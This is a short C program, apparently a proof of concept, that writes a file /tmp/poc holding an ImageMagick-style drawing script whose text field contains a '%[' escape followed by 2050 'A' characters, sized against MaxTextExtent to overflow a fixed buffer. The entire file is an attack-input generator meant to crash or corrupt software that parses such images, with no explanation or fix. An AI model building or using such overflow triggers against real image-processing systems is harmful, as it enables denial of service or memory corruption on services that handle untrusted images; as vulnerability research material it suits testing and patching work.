#include <stdio.h>
#include <stdlib.h>

#define MaxTextExtent 2050

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    fprintf(f, "push graphic-context\n");
    fprintf(f, "text 0,0 \"");
    fputc('%', f);
    fputc('[', f);
    for (int i = 0; i < MaxTextExtent; i++)
        fputc('A', f);
    fputc(']', f);
    fprintf(f, "\"\n");
    fprintf(f, "pop graphic-context\n");

    fclose(f);
    return 0;
}